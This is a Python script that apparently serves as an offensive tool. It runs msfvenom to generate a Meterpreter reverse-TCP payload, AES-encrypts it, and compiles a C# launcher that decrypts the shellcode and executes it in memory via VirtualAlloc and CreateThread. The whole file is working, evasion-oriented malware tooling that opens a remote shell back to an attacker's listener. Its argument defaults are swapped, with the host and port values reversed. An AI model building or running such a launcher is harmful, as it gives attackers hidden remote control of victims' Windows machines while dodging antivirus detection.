#!/usr/bin/env python3
import argparse, subprocess, os

def main():
	args = parse_args()
	lhost = args.lhost
	lport = args.lport
	key = args.key
	payload = args.payload
	filename = args.filename

	''' generate msfvenom payload '''
	print("[+] Generating MSFVENOM payload...")
	result = subprocess.run(['msfvenom',
		'-p', payload,
		'LPORT=' + lport,
		'LHOST=' + lhost,
		'-f', 'csharp'],
		capture_output=True)

	buf = result.stdout.decode('utf-8')

	''' insert buf into template'''
	print("[+] Generating encryptor.cs file...")
	template = get_encryptor_template()
	template = template.replace('~BUF~', buf)
	template =  template.replace('~KEY~', key)

	'''save template to .cs file'''
	f = open("./encryptor.cs", "w")
	f.write(template)
	f.close()

	'''compile file'''
	print("[+] Compiling the encryptor...")
	os.system("mcs ./encryptor.cs /out:encryptor.exe>/dev/null");

	'''run the file'''
	print("[+] Running the encryptor...")
	os.system("mono ./encryptor.exe");
	result = subprocess.run(['mono',
		'./encryptor.exe'],
		capture_output=True)

	base64 = result.stdout.decode('utf-8').replace('\n','')

	''' change template '''
	print("[+] Generating launcher.cs file...")
	template = get_decryptor_template()
	template = template.replace('~BASE64~', base64)
	template =  template.replace('~KEY~', key)

	'''save template to .cs file'''
	f = open("./launcher.cs", "w")
	f.write(template)
	f.close()

	'''compile file'''
	print("[+] Compiling the launcher...")
	os.system("mcs ./launcher.cs /out:./" + filename  + ">/dev/null");

	print("[+] Launcher compiled and written to ./" + filename)
	print("[+] Have a nice day!")

def parse_args():
	parser = argparse.ArgumentParser()

	parser.add_argument("-k", "--key", default="l33tcrpyto", type=str,
		help="The key used to encrypt the msfvenom payload.")
	parser.add_argument("-l", "--lport", default="0.0.0.0", type=str,
		help="The local port that msfconsole is listening on.")
	parser.add_argument("-i", "--lhost", default="4444", type=str,
			help="The local host that msfconsole is listening on.")
	parser.add_argument("-p", "--payload", default = "windows/meterpreter/reverse_tcp", type=str,
		help="The payload to generate in msfvenom.")
	parser.add_argument("-f", "--filename", default = "launcher.exe", type=str,
		help="The filename of the executable.")

	return parser.parse_args()

def get_encryptor_template():
	return '''
using System;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace Launcher
{
    static class Program
    {
        static void Main()
        {
            // replace with your own shellcode
            // e.g. msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.14.5 -f csharp
            ~BUF~

            // remember to use your own key to encrypt the shellcode
            string b64 = Encrypt("~KEY~", buf);
            Console.WriteLine(b64);
        }

        static string Encrypt(string key, byte[] data)
        {
            byte[] tempKey = Encoding.UTF8.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            // encrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform enc = aes.CreateEncryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msEncrypt = new MemoryStream())
            {
                using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, enc, CryptoStreamMode.Write))
                {
                    csEncrypt.Write(data, 0, data.Length);
                    csEncrypt.FlushFinalBlock();

                    return Convert.ToBase64String(msEncrypt.ToArray());
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}


'''

def get_decryptor_template():
	return '''
using System;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

namespace Launcher
{
    static class Program
    {

#region "Win32 InteropServices definitions"

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes,
            UInt32 dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );


        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, 
            uint dwSize, 
            uint flAllocationType, 
            uint flProtect
         );

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, 
            UInt32 dwMilliseconds
        );

#endregion

        static void Main()
        {

            // place your own encrypted base64 aes string in here - e.g. meterpreter payload. Use the encryptor.cs file to create.
            string shellcodeb64 = "~BASE64~";

            // remember to change the encryption key!
            byte[] dec_shellcode = Decrypt("~KEY~", shellcodeb64);
            RunShellcode(dec_shellcode);
        }

        public static void RunShellcode(byte[] shellcode)
        {
            // 0x1000 = MEM_COMMIT
            // 0x40 = PAGE_EXECUTE_READWRITE
            IntPtr buffer = VirtualAlloc(IntPtr.Zero, (UInt32)shellcode.Length, 0x1000, 0x40);
            Marshal.Copy(shellcode, 0, (IntPtr)(buffer), shellcode.Length);
            IntPtr thread = IntPtr.Zero;
            UInt32 threadId = 0;
            thread = CreateThread(IntPtr.Zero, 0, buffer, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(thread, 0xFFFFFFFF);
        }

        static byte[] Decrypt(string key, string aes_base64)
        {
            byte[] tempKey = Encoding.ASCII.GetBytes(key);
            tempKey = SHA256.Create().ComputeHash(tempKey);

            byte[] data = Convert.FromBase64String(aes_base64);

            // decrypt data
            Aes aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));

            using (MemoryStream msDecrypt = new MemoryStream())
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
                {

                    csDecrypt.Write(data, 0, data.Length);

                    return msDecrypt.ToArray();
                }
            }
        }

        static byte[] SubArray(byte[] a, int length)
        {
            byte[] b = new byte[length];
            for (int i = 0; i < length; i++)
            {
                b[i] = a[i];
            }
            return b;
        }
    }
}
'''
if __name__ == '__main__':
	main()
